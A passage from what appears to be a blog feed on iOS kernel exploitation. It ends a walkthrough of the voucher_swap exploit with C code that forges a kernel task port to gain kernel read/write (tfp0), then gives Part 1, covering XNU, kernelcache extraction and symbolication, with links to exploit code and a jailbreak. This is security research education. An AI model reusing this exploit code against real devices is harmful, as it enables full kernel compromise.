    	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;build_fake_kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Copy the contents into the kernel.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not write fake kernel_task into kernel memory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Modify fake_port's ipc_entry so that it points to our new fake port.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_ipc_port_lookup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not look up the IPC entry for the fake port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kernel_write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ie_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Clear ie_request to avoid a panic on termination.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kernel_write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ie_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// At this point fake_port has been officially donated to kernel_task_port.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;fail_1:&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;fail_0:&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-28-clean-up-the-unneeded-resources&quot;&gt;Step 28: Clean up the unneeded resources&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 28\. We've corrupted a bunch of kernel state, so let's clean up our mess:&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//   - base_port has an extra port reference.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//   - uaf_voucher_port needs to be destroyed.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//   - ip_requests needs to be deallocated.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//   - leaked_kmsgs need to be destroyed.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;clean_up&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_kmsgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaked_kmsgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaked_kmsgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-29-clean-up-some-more-unneeded-resources-and-now-we-have-a-stable-tfp0&quot;&gt;Step 29: Clean up some more unneeded resources and now we have a stable tfp0&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 29\. And finally, deallocate the remaining unneeded (but non-corrupted) resources.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;pipe_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    	&lt;span class=&quot;c1&quot;&gt;// And that's it! Enjoy kernel read/write via kernel_task_port.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;done! port 0x%x is tfp0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;All set, now we have acheived full kernel read/write.&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;In this article, we looked at the voucher_swap() vulnerability discovered by &lt;strong&gt;@_bazad&lt;/strong&gt; and explained the steps leading up to obtain tfp0 in iOS 12. In the next article, we will look at the &lt;strong&gt;Undecimus&lt;/strong&gt; jailbreak and all the steps needed to successfully jailbreak an iOS device.&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Project Zero Issue tracker - https://bugs.chromium.org/p/project-zero/issues/detail?id=1731&lt;/li&gt;
  &lt;li&gt;iOS 10 - Kernel Heap Revisited - https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf&lt;/li&gt;
  &lt;li&gt;Mac OS X Internals: A Systems Approach - https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541&lt;/li&gt;
  &lt;li&gt;MacOS and iOS Internals, Volume III: Security &amp;amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535&lt;/li&gt;
  &lt;li&gt;MacOS and iOS Internals, Volume III: Security &amp;amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535&lt;/li&gt;
  &lt;li&gt;CanSecWest 2017 - Port(al) to the iOS Core - https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>From zero to tfp0 - Part 1: Prologue</title>
   <link href="https://bitbrain.github.io/2020/06/01/from-zero-to-tfp0-part-1-prologue.html"/>
   <updated>2020-06-01T00:35:00+00:00</updated>
   <id>https://bitbrain.github.io/2020/06/01/from-zero-to-tfp0-part-1-prologue</id>
   <content type="html">&lt;p&gt;On Jan 22, 2019, Google Project Zero researcher &lt;a href=&quot;https://twitter.com/_bazad&quot;&gt;@_bazad&lt;/a&gt; tweeted the following.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If you’re interested in bootstrapping iOS kernel security research (including the ability to forge PACs and call arbitrary kernel functions), keep an A12 research device on iOS 12.1.2.&lt;/p&gt;

  &lt;p&gt;— Brandon Azad (@_bazad) &lt;a href=&quot;https://twitter.com/_bazad/status/1087782723970785281?ref_src=twsrc%5Etfw&quot;&gt;January 22, 2019&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It was a reference counting bug in MIG (Message Interface generator) generated code. The PoC included a code snippet that would trigger the bug and cause a kernel panic. This was followed later by a complete PoC that provided the Kernel task port (tfp0) to userland thereby enabling arbitrary kernel read and write.&lt;/p&gt;

&lt;!--more--&gt;

&lt;blockquote&gt;
  &lt;p&gt;The A12, now with more kernel code execution; introducing voucher_swap: &lt;a href=&quot;https://t.co/rVkwo50fgd&quot;&gt;https://t.co/rVkwo50fgd&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;— Brandon Azad (@_bazad) &lt;a href=&quot;https://twitter.com/_bazad/status/1090312918422282241?ref_src=twsrc%5Etfw&quot;&gt;January 29, 2019&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The bug was then used to develop a complete jailbreak for iOS 12 using various contributions from the community. This blog series is divided into three parts.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Part 1 deals with iOS security basics, which are fundamental in understanding the next two parts. It discusses kernelcache analysis, Mach messaging, Mach Ports, MIG, Heap allocation basics, CoreTrust, PAC, etc and some popular exploitation techniques such as creating a fake kernel task port, task_for_pid() arbitrary kernel read, etc. If you are already aware of these techniques, you can skip to Part 2 directly. During Part 1, I will be giving references which will link to the other two parts which will further reiterate why these concepts are essential to understand.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Part 2 will discuss the actual vulnerability and the whole exploitation steps leading up to the Kernel task port (tfp0).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Part 3 will discuss the steps taken to achieve a jailbreak such as bypassing sandboxing, CoreTrust, enabling rootfs remount etc.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;downloadables&quot;&gt;Downloadables&lt;/h2&gt;

&lt;p&gt;Before we get started, you will need the following files to follow along.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A copy of the vulnerable xnu kernel - &lt;a href=&quot;https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz&quot;&gt;xnu-4903.221.2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;The voucher_swap exploit code - &lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/attachment?aid=377026&amp;amp;signed_aid=RWxVCY6jN3pZa8F0_0iOhg==&quot;&gt;voucher_swap&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Latest version of the &lt;a href=&quot;https://github.com/pwn20wndstuff/Undecimus&quot;&gt;Undecimus&lt;/a&gt; jailbreak&lt;/li&gt;
  &lt;li&gt;The &lt;a href=&quot;http://updates-http.cdn-apple.com/2018FallFCS/fullrestores/091-63070/11855120-AC8E-11E8-8110-D73611761120/iPhone_4.7_P3_12.0_16A366_Restore.ipsw&quot;&gt;IPSW&lt;/a&gt; for iOS12.0 for iPhone8&lt;/li&gt;
  &lt;li&gt;Hopper, IDA Pro, Or Binary-Ninja, whichever reversing tool you prefer.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;jtool2&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;xnu-kernel&quot;&gt;XNU Kernel&lt;/h2&gt;

&lt;p&gt;The iOS Kernelcache comprises of the core kernel and it’s kernel extensions. The kernel code in itself is closed source; however, it is based on a fork of the open source XNU Kernel which is also used on Mac OS. The XNU kernel can be downloaded from opensource.apple.com.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since the last couple of years, Apple has been open sourcing the ARM specific code as well, that can be found under &lt;strong&gt;ifdef CONFIG_EMBEDDED&lt;/strong&gt; statements. Apple however still decides to keep some implementations to itself.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;

    &lt;span class=&quot;mi&quot;&gt;27285&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;timezone&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27286&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt;  
    &lt;span class=&quot;mi&quot;&gt;27287&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFIG_EMBEDDED&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27288&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;NPROC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;          &lt;span class=&quot;cm&quot;&gt;/* Account for TOTAL_CORPSES_ALLOWED by making this slightly lower than we can. */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27289&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;87&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;NPROC_PER_UID&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;950&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27290&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27291&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;maxprocperuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NPROC_PER_UID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27292&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;  
    &lt;span class=&quot;mi&quot;&gt;27293&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFIG_EMBEDDED&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27294&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hard_maxproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NPROC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* hardcoded limit -- for embedded the number of processes is limited by the ASID space */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;27295&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It is possible to identify some vulnerabilities in the kernel by just auditing the source code. Some vulnerabilities can, however, be identified only by compiling the kernel (e.g., voucher_swap) and looking under the BUILD directory, which provides access to MIG generated code. Vulnerabilities that are present in kernel extensions are usually identified by reverse engineering since the Kexts code is not usually open source. Some vulnerabilities might be relevant only on Mac OS while some will be relevant only for iOS.&lt;/p&gt;

&lt;h2 id=&quot;kernelcache&quot;&gt;Kernelcache&lt;/h2&gt;

&lt;p&gt;The kernelcache is a single &lt;strong&gt;Mach-O&lt;/strong&gt; binary which includes the core kernel along with its kernel extensions. It used to be encrypted until iOS 10, after which Apple surprisingly decided to release the kernelcache unencrypted, citing performance reasons as the primary factor. It can now be easily unpacked and extracted from the IPSW file. Before this, the kernelcache was usually dumped from the memory once a kernel vulnerability was identified, or by getting access to the encryption keys (from theiphonewiki or using a bootrom exploit).&lt;/p&gt;

&lt;p&gt;To find the decompressed kernelcache, simple unzip the ipsw file and look for the kernelcache file.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prateek:mv iPhone_4.7_P3_12.0_16A366_Restore.ipsw iPhone_4.7_P3_12.0_16A366_Restore.zip
prateek:unzip iPhone_4.7_P3_12.0_16A366_Restore.zip
Archive:  iPhone_4.7_P3_12.0_16A366_Restore.zip
  inflating: Restore.plist
   creating: Firmware/
   creating: Firmware/usr/
   creating: Firmware/usr/local/
  inflating: BuildManifest.plist
   creating: Firmware/AOP/
  inflating: Firmware/AOP/aopfw-t8010aop.im4p
  inflating: Firmware/D201_CallanFirmware.im4p
  ....
  inflating: kernelcache.release.iphone10
  inflating: Firmware/ICE16-3.00.01.Release.plist
  inflating: kernelcache.release.iphone9
  inflating: Firmware/ICE17-2.00.01.Release.plist
   creating: Firmware/Maggie/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To list all the kernel extensions and split them into corresponding kext files, you can use &lt;strong&gt;**jtool2&lt;/strong&gt;**.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;IDA detects a kernelcache by its magic value and gives you an option to split the kernelcache into its corresponding kext files as well. You can now reverse these kernel extensions separately in order to find vulnerabilities within them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On a jailbroken iOS device, the decompressed kernelcache can be found under &lt;strong&gt;/System/Library/Caches/com.apple.kernelcaches/kernelcache&lt;/strong&gt;. Some jailbreaks use this file in order to find the address of certain symbols and offsets dynamically rather than using hardcoded offsets. An excellent example of this is the Qilin toolkit created by @morpheus.&lt;/p&gt;

&lt;h2 id=&quot;symbolicating-kernelcache&quot;&gt;Symbolicating Kernelcache&lt;/h2&gt;

&lt;p&gt;Symbolicating a binary can involve a lot of manual effort. Until iOS 11, the kernelcache used to ship with certain symbols. Since iOS 12, Apple decided to strip the kernelcache of all symbols, but not before mistakingly releasing a beta version with all symbols intact. The IPSW was later removed from the downloads section. The following image shows the symbol count obtained by &lt;strong&gt;jtool2&lt;/strong&gt; on an iOS 12 kernelcache (stripped) and the iOS 12 beta kernelcache that was released with all symbols intact.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The one kernelcache that was released with symbols was then later used by &lt;strong&gt;jtool2&lt;/strong&gt; in creating symbols for the newer iOS kernelcaches. One of the most useful features of &lt;strong&gt;jtool2&lt;/strong&gt; is its &lt;strong&gt;analyze&lt;/strong&gt; command where you can feed it an iOS 12 kernelcache, and it will spit out the symbols for it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the companion file generated has about 12000 symbols.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In case you have the $$$, one of the easiest ways is to use the Lumina feature introduced with IDA 7.2 to get the symbols.&lt;/p&gt;

